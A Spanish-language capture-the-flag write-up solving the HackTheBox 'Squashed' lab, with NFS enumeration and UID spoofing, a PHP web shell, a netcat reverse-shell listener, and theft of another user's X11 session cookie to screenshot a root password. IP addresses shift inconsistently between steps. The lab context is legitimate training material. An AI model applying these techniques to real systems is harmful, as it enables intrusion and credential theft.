---
title: HTB - Squashed
published: true
categories: [Linux]
tags: [OSCP, Fácil]
---


<img src="/assets/HTB/Squashed/squashed.png">


¡Hola!
Vamos a resolver de la máquina `Squashed` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **NFS Enumeration**
- **Abusing owners assigned to NFS**
- **Creating a web shell to gain system access**
- **Abusing .Xauthority file (Pentesting X11)**
- **Taking a screenshot of another user's display**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Squashed`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.191
PING 10.10.11.191 (10.10.11.191) 56(84) bytes of data.
64 bytes from 10.10.11.191: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.11.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.191 -oG allPorts

PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
2049/tcp  open  nfs     syn-ack ttl 63
33743/tcp open  unknown syn-ack ttl 63
38471/tcp open  unknown syn-ack ttl 63
39701/tcp open  unknown syn-ack ttl 63
50853/tcp open  unknown syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80,111,2049,33743,38471,39701,50853 10.10.11.191 -oN targeted

22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      36633/tcp   mountd
|   100005  1,2,3      41559/udp   mountd
|   100005  1,2,3      52031/tcp6  mountd
|   100005  1,2,3      54808/udp6  mountd
|   100021  1,3,4      36991/tcp   nlockmgr
|   100021  1,3,4      43411/tcp6  nlockmgr
|   100021  1,3,4      45829/udp   nlockmgr
|   100021  1,3,4      47382/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
36633/tcp open  mountd   1-3 (RPC #100005)
36991/tcp open  nlockmgr 1-4 (RPC #100021)
44335/tcp open  mountd   1-3 (RPC #100005)
50771/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.11.191
http://10.10.11.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.191], JQuery[3.0.0], Script, Title[Built Better], X-UA-Compatible[IE=edge]
```

Accedemos al servicio web pero no vemos nada interesante donde poder sacar información

### Reconocimiento NFS

* * *

Nos llama la atención el puerto `2049/tcp  open  nfs_acl`. Consultamos en [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting) y vemos que se trata de un sistema cliente/servidor que permite a los usuarios acceder a archivos de la red y tratarlos como si fueran archivos locales. Parecido a SMB. Con el comando `showmount -e <IP>` podemos listar directorios disponibles

```bash
❯ showmount -e 10.10.11.191
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

Para poder montar de forma local estos directorios primero debemos crear dos directorios en nuestra ruta `/mnt`

```bash
❯ mkdir /mnt/ross
❯ mkdir /mnt/web
❯ mount -t nfs 10.10.11.191:/home/ross /mnt/ross
❯ mount -t nfs 10.10.11.191:/var/www/html /mnt/web
```

Si observamos propietarios de los directorios montados vemos que `/mnt/ross` pertenece a 1001 y grupo scanner, y por otro lado `/mnt/web` pertenece a 2017 y grupo www-data

```bash
❯ ls -la /mnt
drwxr-xr-x root root      14 B  Wed Dec  7 16:20:33 2022  .
drwxr-xr-x root root     296 B  Fri Oct 21 09:21:35 2022  ..
drwxr-xr-x 1001 scanner  4.0 KB Wed Dec  7 15:54:43 2022  ross
drwxr-xr-- 2017 www-data 4.0 KB Wed Dec  7 16:20:01 2022  web
```

Para poder enumerar el directorio `/mnt/web` necesitamos crear un usuario y asignarle su uid a 2017

```bash
❯ useradd pepe
❯ usermod -u 2017 pepe
❯ id pepe
uid=2017(pepe) gid=1004(pepe) grupos=1004(pepe)
```

Migramos a usuario `pepe` y ahora ya podemos enumerar su contenido

```bash
❯ su pepe
$ bash
┌─[pepe@parrot]─[/mnt]
└──╼ $cd web
┌─[pepe@parrot]─[/mnt/web]
└──╼ $ls
css  images  index.html  js
```

Observando el contenido de `index.html` vemos que se trata de la web visitada en el puerto 80. Como sabemos que la web está escrita en PHP podemos crear un archivo PHP para que mediante el parámetro `cmd` podamos ejecutar código (RCE). Creamos un archivo `shell.php` con el siguiente contenido

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"
?>
```
Y ahora accedemos a `http://10.10.11.119/shell.php?cmd=id`

<img src="/assets/HTB/Squashed/cmd.png">

Ahora que tenemos RCE procedemos a ejecutar oneliner y ponernos en escucha en el puerto 443 en nuestro equipo atacante

<img src="/assets/HTB/Squashed/shell.png">

```bash
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [10.10.14.40] from (UNKNOWN) [10.10.11.119] 60162
bash: cannot set terminal process group (1058): Inappropriate ioctl for device
bash: no job control in this shell
alex@squashed:/var/www/html$ whoami
whoami
alex
```

En el directorio personal de `alex` encontramos la flag de usuario de bajos privilegios

```bash
alex@squashed:/home/alex$ cat user.txt 
4c40083f03a501580***************
```

### Escalada Privilegios

* * *

En el directorio del usuario `ross` nos llama la atención un archivo `.Xauthority`. Buscamos de qué se trata y vemos que el archivo .Xauthority(no .xAuthority) se puede encontrar en el directorio de inicio de cada usuario y se utiliza para almacenar credenciales en las cookies utilizadas xauthpara la autenticación de las sesiones X. Buscamos recursos en [hackTricks](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11). No tenemos acceso a este archivo directo desde la máquina víctima pero sí podemos acceder a él en la montura creada anteriormente `/mnt/ross` y subirlo al directorio personal de `alex` dónde sí podemos gestionarlo al ser propietarios del directorio `home` donde reside. Modificamos uid de usuario `pepe` a 1001 y así poder acceder a la montura `/mnt/ross`

```bash
❯ usermod -u 1001 pepe
❯ su pepe
$ bash
┌─[pepe@parrot]─[/mnt]
└──╼ $cd ross
┌─[pepe@parrot]─[/mnt/ross]
└──╼ $ls -la
total 64
drwxr-xr-x 14 pepe scanner 4096 dic  7 15:54 .
drwxr-xr-x  1 root root      14 dic  7 16:20 ..
lrwxrwxrwx  1 root root       9 oct 20 15:24 .bash_history -> /dev/null
drwx------ 11 pepe scanner 4096 oct 21 16:57 .cache
drwx------ 12 pepe scanner 4096 oct 21 16:57 .config
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Desktop
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Documents
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Downloads
drwx------  3 pepe scanner 4096 oct 21 16:57 .gnupg
drwx------  3 pepe scanner 4096 oct 21 16:57 .local
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Music
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Pictures
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Public
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Templates
drwxr-xr-x  2 pepe scanner 4096 oct 21 16:57 Videos
lrwxrwxrwx  1 root root       9 oct 21 15:07 .viminfo -> /dev/null
-rw-------  1 pepe scanner   57 dic  7 15:54 .Xauthority
-rw-------  1 pepe scanner 2475 dic  7 15:54 .xsession-errors
-rw-------  1 pepe scanner 2475 oct 31 11:13 .xsession-errors.old
```

Creamos servidor http y subimos archivo `.Xauthority` de usuario `ross` a la carpeta personal del usuario `alex`

```bash
┌─[pepe@parrot]─[/mnt/ross]
└──╼ $python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.119 - - [07/Dec/2022 17:09:00] "GET /.Xauthority HTTP/1.1" 200 -
```

```bash
alex@squashed:/home/alex$ wget http://10.10.14.40:8080/.Xauthority
--2022-12-07 16:08:58--  http://10.10.14.40:8080/.Xauthority
Connecting to 10.10.14.40:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 57 [application/octet-stream]
Saving to: '.Xauthority'

.Xauthority         100%[===================>]      57  --.-KB/s    in 0.04s   

2022-12-07 16:08:58 (1.46 KB/s) - '.Xauthority' saved [57/57]
```

Ahora podemos verificar que haya conexión con los comandos que encontramos en HackTricks. Para ello primero debemos saber qué nombre tiene asignada la pantalla. Con el comando `w` vemos que la pantalla es `:0`

```bash
alex@squashed:/home/alex$ w
 16:32:36 up  1:38,  1 user,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               14:54    1:38m 11.16s  0.06s /usr/libexec/gnome-session-binary --systemd --session=gnome
```

Ahora con `xdpyinfo` verificamos que tengamos conexión

```bash
alex@squashed:/home/alex$ xdpyinfo -display :0
motion buffer size:  256
bitmap unit, bit order, padding:    32, LSBFirst, 32
image byte order:    LSBFirst
number of supported pixmap formats:    7
supported pixmap formats:
    depth 1, bits_per_pixel 1, scanline_pad 32
    depth 4, bits_per_pixel 8, scanline_pad 32
.
.
.
.
```

Una vez verificada la conexión podemos hacer un screenshot de manera remota de  la siguiente forma

```bash
alex@squashed:/home/alex$ xwd -root -screen -silent -display :0 > /tmp/screen.xwd
```

Nos traemos la captura guardada y la convertimos en un formato legible

```bash
❯ wget http://10.10.11.191:8080/screen.xwd
--2022-12-07 17:37:11--  http://10.129.17.11:8080/screen.xwd
Conectando con 10.129.17.11:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1923179 (1,8M) [image/x-xwindowdump]
Grabando a: «screen.xwd»

screen.xwd                                      100%[====================================================================================================>]   1,83M  4,48MB/s    en 0,4s    

2022-12-07 17:37:11 (4,48 MB/s) - «screen.xwd» guardado [1923179/1923179]

convert screen.xwd screen.png
```

Abrimos la captura y encontramos la credencial de root

<img src="/assets/HTB/Squashed/screen.png">

Migramos a root con la password obtenida y la flag la encontramos en el directorio de `/root`

```bash
alex@squashed:/tmp$ su root
Password: 
root@squashed:/tmp# whoami
root
root@squashed:/tmp# cat /root/root.txt 
c3736c2e97d98f2fe***************
```

Hemos completado la máquina **Squashed** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Squashed/pwned.png">
